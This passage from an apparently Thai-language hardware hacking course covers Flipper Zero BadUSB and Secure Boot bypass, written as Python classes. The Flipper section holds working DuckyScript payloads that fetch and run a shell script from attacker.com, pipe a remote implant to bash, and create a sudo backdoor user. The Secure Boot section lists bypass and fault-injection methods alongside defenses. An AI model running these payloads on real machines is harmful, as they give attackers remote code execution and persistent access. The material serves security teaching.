                "Custom hardware attacks via apps"
            ]
        },
        "BadUSB": {
            "description": "HID attack (keyboard/mouse emulation)",
            "attacks": [
                "Rubber Ducky style keystroke injection",
                "DuckyScript payloads",
                "Automated command execution"
            ]
        }
    }
    
    BADUSB_DUCKYSCRIPT_EXAMPLES = [
        {
            "name": "Windows Reverse Shell",
            "script": """
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -C "IEX(IWR 'http://attacker.com/shell.ps1')"
ENTER
"""
        },
        {
            "name": "Linux Backdoor User",
            "script": """
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING sudo useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:password123' | sudo chpasswd
ENTER
"""
        },
        {
            "name": "macOS Persistent Shell",
            "script": """
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING curl -s http://attacker.com/implant.sh | bash
ENTER
"""
        }
    ]
    
    def sub_ghz_analysis_guide(self) -> str:
        """Guide สำหรับวิเคราะห์ RF ด้วย Flipper Zero"""
        return """
# Sub-GHz RF Analysis with Flipper Zero

## Record a Signal:
1. Sub-GHz -> Read Raw
2. Press button/remote to record
3. Save the recording

## Replay:
1. Sub-GHz -> Saved
2. Select recording
3. Send (press button to transmit)

## Analyzing Fixed Code Remotes:
- Record signal
- Sub-GHz -> Frequency Analyzer
- Identify modulation (OOK, FSK, etc.)

## Important Note:
# Replaying garage doors/vehicles in production is illegal
# Use only on test equipment or with written permission
"""

if __name__ == "__main__":
    flipper = FlipperZeroGuide()
    print("Flipper Zero Capabilities:")
    for cap, info in flipper.FLIPPER_CAPABILITIES.items():
        print(f"  {cap}: {info['description']}")
        print(f"    Attacks: {', '.join(info['attacks'][:2])}")
    
    print("\nBadUSB DuckyScript Examples:")
    for example in flipper.BADUSB_DUCKYSCRIPT_EXAMPLES:
        print(f"  {example['name']}")
```

---

## Step 960: Secure Boot และ Hardware Security

```python
from dataclasses import dataclass
from typing import List, Dict

class SecureBootAnalysis:
    """การวิเคราะห์และ Bypass Secure Boot"""
    
    SECURE_BOOT_TYPES = {
        "UEFI Secure Boot (PC)": {
            "mechanism": "Signature verification of bootloader using stored keys",
            "bypass_methods": [
                "Exploit vulnerability in signed bootloader (BootHole)",
                "Physical CMOS reset to clear Secure Boot keys",
                "DMA attack via Thunderbolt/PCIe",
                "Custom key enrollment (if physically accessible)"
            ]
        },
        "ARM TrustZone": {
            "mechanism": "Secure World / Normal World separation",
            "bypass_methods": [
                "Voltage fault injection (VFI)",
                "Clock glitching",
                "JTAG debug access in early boot",
                "TrustZone bootloader vulnerability"
            ]
        },
        "Custom Secure Boot (IoT)": {
            "mechanism": "Device-specific signature verification",
            "bypass_methods": [
                "UART debug interface during boot",
                "JTAG memory patching",
                "SPI flash modification",
                "Cold boot attack via voltage glitch"
            ]
        }
    }
    
    FAULT_INJECTION_OVERVIEW = """
# Fault Injection Attacks on Hardware

## Voltage Fault Injection (VFI):
- Apply brief voltage spike to VCC
- Can cause CPU to skip instructions
- Skip security checks during boot
- Tools: Picocom + bench power supply, ChipWhisperer

## Clock Glitching:
- Manipulate clock signal timing
- Cause processor errors at specific instructions
- Tools: ChipWhisperer, FPGA-based tools

## Laser Fault Injection:
- Use laser on chip die
- Flip specific bits in memory/registers
- High precision, expensive equipment needed

## ChipWhisperer - Professional Fault Injection:
# Install: pip install chipwhisperer
import chipwhisperer as cw

# Connect to ChipWhisperer
scope = cw.scope()
target = cw.target(scope)
scope.default_setup()

# Configure glitch parameters
scope.glitch.clk_src = 'clkgen'
scope.glitch.output = 'enable_only'
scope.glitch.trigger_src = 'ext_single'
scope.glitch.width = 10  # Glitch width in ns
scope.glitch.offset = -10  # Offset from trigger

# Capture traces
# (Target specific critical security function)
"""
    
    HARDWARE_SECURITY_DEFENSES = [
        "Disable JTAG/debug interfaces in production",
        "Implement secure boot with signed firmware",
        "Use hardware security modules (HSM/TPM)",
        "Implement tamper detection",
        "Encrypt firmware with device-unique keys",
        "Implement monotonic counter to prevent downgrade",
        "Use secure element for key storage",
        "Physical tamper-evident seals",
        "Potting (encapsulation in epoxy)",
        "Disable test pads/vias in production PCB"
    ]
    
    def secure_boot_verification(self) -> str:
        """Script ตรวจสอบ Secure Boot Configuration"""
        return '''
#!/bin/bash
# Check Secure Boot Status (Linux)

# Check if Secure Boot is enabled
mokutil --sb-state
# or
cat /sys/firmware/efi/efivars/SecureBoot-*

# Check enrolled Secure Boot keys
mokutil --list-enrolled

# Check bootloader signature
pesign --show-signature /boot/efi/EFI/BOOT/BOOTX64.EFI

# Verify kernel signature
pesign --show-signature /boot/vmlinuz

# List trusted keys
mokutil --list-enrolled | grep issuer
'''

if __name__ == "__main__":
    sba = SecureBootAnalysis()
    print("Secure Boot Types:")
    for boot_type, info in sba.SECURE_BOOT_TYPES.items():
        print(f"  {boot_type}:")
        for bypass in info["bypass_methods"][:2]:
            print(f"    - {bypass}")
    
    print("\nHardware Security Defenses:")
    for defense in sba.HARDWARE_SECURITY_DEFENSES[:5]:
        print(f"  - {defense}")
```

---

## สรุป Part 96 (Steps 951-960)

| Step | หัวข้อ | เนื้อหา |
|------|--------|--------|
| 951 | HW Hacking Fundamentals | Tools, attack categories, IoT checklist |
| 952 | UART Exploitation | Pin identification, JTAGulator, bootloader, minicom |
| 953 | JTAG/SWD | OpenOCD, JTAGulator, Secure boot bypass |
| 954 | SPI Flash Reading | Flashrom, SOIC8 clip, CH341A, in-circuit reading |
| 955 | Firmware Analysis | Binwalk, filesystem extraction, Firmwalker, EMBA |
| 956 | IoT Protocol Analysis | BLE, MQTT, Zigbee, RF, attack scripts |
| 957 | Firmware RE | Ghidra workflow, architecture identification, strings |
| 958 | IoT Vulnerability Research | OWASP IoT Top 10, web interface testing |
| 959 | Flipper Zero | Sub-GHz, RFID, NFC, BadUSB, DuckyScript |
| 960 | Secure Boot | Bypass techniques, fault injection, ChipWhisperer |
